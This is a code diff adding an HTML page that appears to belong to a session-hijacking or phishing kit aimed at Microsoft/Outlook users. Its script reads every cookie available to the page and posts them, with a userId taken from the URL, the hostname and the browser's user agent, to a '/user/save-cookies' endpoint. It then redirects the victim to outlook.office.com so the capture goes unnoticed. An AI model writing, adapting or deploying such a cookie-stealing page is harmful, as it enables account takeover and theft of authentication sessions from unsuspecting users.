@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Capturing Session...</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: white;
+        }
+        .container {
+            text-align: center;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid white;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>🔐 Capturing Authentication Cookies</h2>
+        <div class="spinner"></div>
+        <p id="status">Establishing Microsoft session...</p>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const userId = urlParams.get('userId');
+        
+        document.getElementById('status').textContent = 'Reading session cookies...';
+        
+        // Capture all available cookies
+        setTimeout(() => {
+            const cookies = document.cookie;
+            console.log('Available cookies:', cookies);
+            
+            // Send cookies to server
+            fetch('/user/save-cookies', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    userId: userId,
+                    cookies: cookies,
+                    domain: window.location.hostname,
+                    userAgent: navigator.userAgent
+                })
+            }).then(response => response.json())
+            .then(data => {
+                document.getElementById('status').textContent = `✅ Captured ${data.count || 0} cookies`;
+                setTimeout(() => {
+                    window.location.href = 'https://outlook.office.com';
+                }, 2000);
+            }).catch(error => {
+                document.getElementById('status').textContent = '❌ Capture failed';
+                console.error('Error:', error);
+            });
+        }, 1000);
+    </script>
+</body>
+</html>
